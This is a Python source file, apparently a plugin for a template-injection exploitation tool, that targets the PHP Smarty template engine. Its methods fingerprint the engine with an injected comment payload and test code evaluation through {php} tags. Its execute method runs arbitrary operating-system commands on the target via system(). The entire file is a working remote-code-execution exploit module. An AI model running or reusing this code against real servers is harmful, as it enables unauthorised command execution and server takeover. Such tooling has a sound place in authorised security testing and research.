from core.check import Check
from utils.loggers import log
from utils import rand
from utils.strings import quote

class Smarty(Check):

    render_tag = '{%(payload)s}'
    header_tag = '{%(header)s}'
    trailer_tag = '{%(trailer)s}'
    contexts = [
        { 'level': 1, 'prefix': '}', 'suffix' : '${' },
    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.inject(payload):
            self.set('language', 'php')
            self.set('engine', 'smarty')

    def detect_eval(self):

        expected_rand = str(rand.randint_n(1))
        payload = """print('%s');""" % expected_rand

        result_php_tag = self.evaluate(payload)

        # If {php} is sent back means is in secure mode
        if expected_rand == result_php_tag:
            self.set('eval', 'php')
            self.set('os', self.evaluate('echo PHP_OS;'))


    def evaluate(self, code):
        return self.inject('{php}%s{/php}' % (code))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        return self.evaluate("""system("%s");""" % (quote(command)))
